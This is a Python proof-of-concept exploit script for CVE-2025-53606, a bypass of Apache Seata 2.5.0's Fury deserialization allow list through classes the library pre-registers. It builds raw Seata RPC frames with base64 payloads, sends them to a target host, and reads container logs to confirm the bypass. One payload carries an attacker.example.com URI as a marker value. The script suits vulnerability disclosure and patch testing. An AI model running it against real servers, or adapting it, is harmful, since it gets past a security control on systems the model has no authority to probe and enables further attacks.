#!/usr/bin/env python3
# ---------------------------------------------------------------
# Exploit Title  : CVE-2025-53606 — AllowListChecker Pre-Registration Bypass
# Affected        : Apache Seata 2.5.0 (patched, but bypass exists)
# Author          : Exploit Intelligence Platform (EIP)
# Website         : https://exploit-intel.com
# Twitter/X       : @exploit_intel
# CVSS            : 9.8 CRITICAL (original CVE)
# CWE             : CWE-502 — Deserialization of Untrusted Data
# ---------------------------------------------------------------
"""
CVE-2025-53606 Bypass PoC: AllowListChecker Pre-Registration Bypass

BYPASS TECHNIQUE:
The fix for CVE-2025-53606 replaces the broken lambda ClassChecker with
Fury's AllowListChecker(STRICT). However, Fury pre-registers built-in
serializers for many common classes during initialization (in
ClassResolver.addDefaultSerializers()). These pre-registered classes are
stored in the internal class cache (classNameBytes2Class) BEFORE the
AllowListChecker is set.

When deserializing, Fury's xreadClass() method retrieves classes from
the cache without invoking the ClassChecker, allowing pre-registered
types to bypass the AllowListChecker entirely.

This PoC demonstrates that non-whitelisted classes (URI, PriorityQueue,
ConcurrentHashMap, AtomicInteger) can be deserialized on the PATCHED
Seata 2.5.0 server despite not being in the whitelist.

IMPACT:
- LOW to MEDIUM: The pre-registered types are mostly safe value types
  and do not enable direct RCE
- The bypass violates the security model — the whitelist should control
  ALL deserialization, but 36+ types slip through
- Future Fury versions adding dangerous pre-registered types would
  silently bypass the fix
- Demonstrates an architectural gap between Fury's initialization order
  and the security check mechanism

Usage:
  python3 bypass_poc.py <target_host> <target_port> [container_name]
  python3 bypass_poc.py localhost 8092 cve-2025-53606-patched
"""

import sys
import socket
import struct
import base64
import time
import subprocess

# ============================================================================
# Seata RPC v1 Protocol Constants
# ============================================================================
MAGIC = b'\xda\xda'
PROTOCOL_VERSION = b'\x01'
HEAD_LENGTH = 16
MSG_TYPE_SYNC_REQUEST = 0x00
CODEC_FURY = 0x56
COMPRESSOR_NONE = 0x00
DEFAULT_PORT = 8091
RECV_TIMEOUT = 5

# ============================================================================
# Pre-generated Fury payloads using ONLY pre-registered types
# These bypass the AllowListChecker because they are in Fury's internal cache
# ============================================================================
BYPASS_PAYLOADS = {
    "uri_map": {
        "description": "HashMap<URI, String> — URI is pre-registered, bypasses AllowListChecker",
        "target_class": "java.net.URI",
        "b64": "Av////8ARAEApgHEAWh0dHA6Ly9hdHRhY2tlci5leGFtcGxlLmNvbS9jdmUtMjAyNS01MzYwNi1ieXBhc3P/LDBieXBhc3MtcHJvb2Y=",
        "evidence_pattern": "attacker.example.com/cve-2025-53606-bypass",
        "evidence_keyword": "bypass-proof",
    },
    "priority_queue": {
        "description": "PriorityQueue<String> — PriorityQueue is pre-registered, not in whitelist",
        "target_class": "java.util.PriorityQueue",
        "b64": "Av////8A4gEC/QQsOGJ5cGFzc19wcm9vZl8xOGJ5cGFzc19wcm9vZl8y",
        "evidence_pattern": "bypass_proof_1",
        "evidence_keyword": "bypass_proof",
    },
    "concurrent_hashmap": {
        "description": "ConcurrentHashMap<String,String> — CHM pre-registered, not in whitelist",
        "target_class": "java.util.concurrent.ConcurrentHashMap",
        "b64": "Av////8AfAH/LChieXBhc3Nfa2V5/yzMAWJ5cGFzc192YWx1ZV9mcm9tX25vbl93aGl0ZWxpc3RlZF9Db25jdXJyZW50SGFzaE1hcA==",
        "evidence_pattern": "bypass_key",
        "evidence_keyword": "bypass_value_from_non_whitelisted",
    },
    "atomic_integer": {
        "description": "HashMap<String,AtomicInteger> — AtomicInteger pre-registered, not in whitelist",
        "target_class": "java.util.concurrent.atomic.AtomicInteger",
        "b64": "Av////8ARAH/LDRieXBhc3NfYXRvbWljAIQBOQUAAA==",
        "evidence_pattern": "bypass_atomic",
        "evidence_keyword": "bypass_atomic",
    },
}


def build_seata_frame(fury_payload: bytes) -> bytes:
    """Build a Seata RPC v1 protocol frame."""
    full_length = HEAD_LENGTH + len(fury_payload)
    header = MAGIC + PROTOCOL_VERSION
    header += struct.pack('>i', full_length)
    header += struct.pack('>h', HEAD_LENGTH)
    header += struct.pack('B', MSG_TYPE_SYNC_REQUEST)
    header += struct.pack('B', CODEC_FURY)
    header += struct.pack('B', COMPRESSOR_NONE)
    header += struct.pack('>i', 1)  # Request ID
    return header + fury_payload


def send_payload(host: str, port: int, fury_payload: bytes, timeout: int = RECV_TIMEOUT) -> bytes:
    """Send a Fury payload in a Seata RPC v1 frame."""
    frame = build_seata_frame(fury_payload)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(frame)
        try:
            response = sock.recv(4096)
            return response
        except socket.timeout:
            return b""
    finally:
        sock.close()


def get_container_logs(container_name: str, lines: int = 30) -> str:
    """Retrieve recent container logs."""
    try:
        result = subprocess.run(
            ["docker", "logs", "--tail", str(lines), container_name],
            capture_output=True, text=True, timeout=10
        )
        return result.stdout + result.stderr
    except Exception as e:
        return f"(could not get logs: {e})"


def check_connectivity(host: str, port: int) -> bool:
    """Check if target port is reachable."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        sock.close()
        return True
    except Exception:
        return False


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_host> <target_port> [container_name]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    container_name = sys.argv[3] if len(sys.argv) > 3 else None

    print("=" * 72)
    print("CVE-2025-53606 BYPASS PoC: AllowListChecker Pre-Registration Bypass")
    print("=" * 72)
    print(f"Target: {host}:{port}")
    if container_name:
        print(f"Container: {container_name}")
    print()
    print("BYPASS TECHNIQUE: Fury pre-registers built-in serializers during")
    print("initialization. These classes are cached BEFORE AllowListChecker is set,")
    print("so xreadClass() returns them without invoking the ClassChecker.")
    print()

    # Check connectivity
    print("[*] Checking target connectivity...")
    if not check_connectivity(host, port):
        print(f"[-] Cannot connect to {host}:{port}")
        sys.exit(1)
    print(f"[+] Port {port} is open")
    print()

    results = {}
    bypassed = 0
    blocked = 0

    # Get baseline logs (before our test)
    if container_name:
        baseline_logs = get_container_logs(container_name, 5)

    for name, payload_info in BYPASS_PAYLOADS.items():
        print(f"[*] Testing bypass payload: {name}")
        print(f"    Description: {payload_info['description']}")
        print(f"    Target class: {payload_info['target_class']}")

        fury_payload = base64.b64decode(payload_info['b64'])
        frame = build_seata_frame(fury_payload)
        print(f"  Sending {len(frame)} bytes (header: {HEAD_LENGTH}, body: {len(fury_payload)})")

        # Clear log position before sending
        if container_name:
            pre_logs = get_container_logs(container_name, 5)

        response = send_payload(host, port, fury_payload)
        if response:
            print(f"  Response: {len(response)} bytes")
        else:
            print(f"  No response within {RECV_TIMEOUT}s (server processed silently)")

        # Check server logs for evidence
        time.sleep(1)
        if container_name:
            logs = get_container_logs(container_name, 20)
            evidence_found = False
            insecure_found = False
            body_content = None

            for line in logs.split('\n'):
                # Check for AllowListChecker blocking
                if "isn't in allow list" in line or "is forbidden" in line:
                    insecure_found = True
                    print(f"  [BLOCKED] AllowListChecker: {line.strip()[:120]}")

                # Check for successful deserialization evidence
                if payload_info['evidence_pattern'] in line:
                    evidence_found = True
                    body_content = line.strip()

                # Check for rpcMessage body content
                if "rpcMessage body" in line and payload_info['evidence_keyword'] in line:
                    evidence_found = True
                    body_content = line.strip()

                # Check for object content in read objects
                if "read objects are" in line and payload_info['evidence_keyword'] in line:
                    evidence_found = True
                    body_content = line.strip()

            if evidence_found:
                print(f"  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!")
                if body_content:
                    print(f"      Evidence: {body_content[:200]}")
                results[name] = "BYPASSED"
                bypassed += 1
            elif insecure_found:
                print(f"  [-] Blocked by AllowListChecker (fix working)")
                results[name] = "BLOCKED"
                blocked += 1
            else:
                # Check if payload was processed (deserialization error without InsecureException)
                for line in logs.split('\n'):
                    if "Decode frame error" in line:
                        # Deserialization error — but was it because of AllowListChecker
                        # or because the deserialized object isn't a valid Seata message?
                        if "read objects are:" in line:
                            obj_content = line.split("read objects are:")[1].strip()
                            if obj_content not in ["[null]", "[{}, null]"]:
                                # Non-empty deserialized content = bypass worked
                                print(f"  [+] BYPASS CONFIRMED: Deserialized non-null content")
                                print(f"      Objects: {obj_content[:200]}")
                                results[name] = "BYPASSED"
                                bypassed += 1
                            else:
                                print(f"  [?] Deserialized but content empty: {obj_content}")
                                results[name] = "UNCLEAR"
                        break
                else:
                    print(f"  [?] No definitive evidence in logs")
                    results[name] = "UNCLEAR"
        print()

    # Print summary
    print("=" * 72)
    print("RESULTS SUMMARY")
    print("=" * 72)
    for name, result in results.items():
        payload = BYPASS_PAYLOADS[name]
        status = "✓ BYPASSED" if result == "BYPASSED" else "✗ BLOCKED" if result == "BLOCKED" else "? UNCLEAR"
        print(f"  [{status}] {name}: {payload['description'][:70]}")
    print()

    if bypassed > 0:
        print(f"[+] {bypassed}/{len(BYPASS_PAYLOADS)} payloads bypassed the AllowListChecker on patched server")
        print("[+] The fix is INCOMPLETE — pre-registered types bypass the ClassChecker")
        print()
        print("SEVERITY ASSESSMENT:")
        print("  The bypass allows deserialization of 36+ non-whitelisted types that")
        print("  Fury pre-registers during initialization. While these types are mostly")
        print("  safe value types (no direct RCE), this violates the security model and")
        print("  creates an architectural gap where future Fury versions adding dangerous")
        print("  pre-registered types would silently bypass the fix.")
    else:
        print(f"[-] All payloads were blocked — fix appears effective")

    return 0 if bypassed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
